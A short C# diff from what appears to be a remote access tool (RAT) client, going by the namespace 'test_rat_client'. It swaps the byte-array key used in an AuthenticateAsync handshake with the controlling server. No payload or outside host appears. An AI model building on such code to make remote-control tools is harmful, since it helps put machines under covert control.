@@ -123,7 +123,7 @@ namespace test_rat_client
         public async Task<bool> AuthenticateAsync(int type, int id = 0)//0 = main, 1 = heartbeat, 2 = anything else
         {
             byte[] data;
-            byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 };
+            byte[] comp = new byte[] { 123, 45, 67, 89, 12, 34, 56, 78, 90, 23, 45, 67, 89, 101, 112, 131 };
             try
             {
                 sock.SetRecvTimeout(5000);
